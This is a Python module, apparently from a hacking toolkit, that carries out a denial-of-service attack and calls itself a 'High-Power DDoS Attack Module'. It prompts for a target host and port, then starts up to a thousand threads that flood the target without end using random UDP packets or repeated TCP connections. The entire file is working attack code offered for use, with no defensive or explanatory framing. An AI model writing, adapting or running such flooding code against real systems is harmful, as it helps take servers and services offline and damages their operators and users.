import os
import time
import socket
import threading
from modules import utils

def run():
    utils.print_banner()
    utils.notify("High-Power DDoS Attack Module", "red")

    target = input("\n\033[1;92m[?] Enter Target IP or Host: \033[0m").strip()
    port = input("\033[1;92m[?] Enter Target Port (Default 80): \033[0m").strip()
    port = int(port) if port else 80

    threads = input("\033[1;92m[?] Threads (Default 1000): \033[0m").strip()
    threads = int(threads) if threads else 1000

    method = input("\033[1;92m[?] Method [UDP/TCP] (default UDP): \033[0m").lower()
    method = method if method in ["udp", "tcp"] else "udp"

    try:
        socket.gethostbyname(target)
    except socket.gaierror:
        utils.error("Invalid Hostname/IP. Try Again.")
        return

    confirm = input(f"\n\033[1;93m[!] Confirm attack on {target}:{port} with {threads} threads? (y/n): \033[0m")
    if confirm.lower() != 'y':
        return

    print(f"\n\033[1;94m[+] Starting {method.upper()} flood on {target}:{port} with {threads} threads...\033[0m")

    def udp_flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_ = os.urandom(1490)
        while True:
            try:
                s.sendto(bytes_, (target, port))
            except:
                pass

    def tcp_flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(os.urandom(1024))
                s.close()
            except:
                pass

    attack_func = udp_flood if method == "udp" else tcp_flood

    try:
        for i in range(threads):
            th = threading.Thread(target=attack_func)
            th.daemon = True
            th.start()
    except Exception as e:
        utils.error(f"Thread creation failed: {str(e)}")
        return

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[1;91m[!] Attack Stopped by User\033[0m\n")
        return
